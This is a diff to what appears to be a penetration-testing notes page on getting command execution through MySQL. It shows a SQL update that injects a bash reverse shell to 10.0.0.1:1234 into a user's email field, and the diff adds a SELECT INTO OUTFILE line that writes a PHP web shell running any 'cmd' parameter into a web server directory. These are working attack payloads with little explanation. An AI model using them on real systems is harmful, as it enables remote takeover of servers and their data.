@@ -105,8 +105,14 @@ Depending on the situation, we may be able to execute arbitrary command.
 ```bash
 # Update existing user email to execute reverse shell
 mysql> update exampledb.users SET email='admin@shell|| bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1" &' where name like 'admin%';
-```
 
+# rev shell
+`SELECT "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE '/xampp/htdocs/rev.php';`
+
+```
+ 
+
+```
 ### System Commands
 We can run the system command in MySQL shell as below. Depending on the situation, we may be able to escalate privileges.
 ```bash
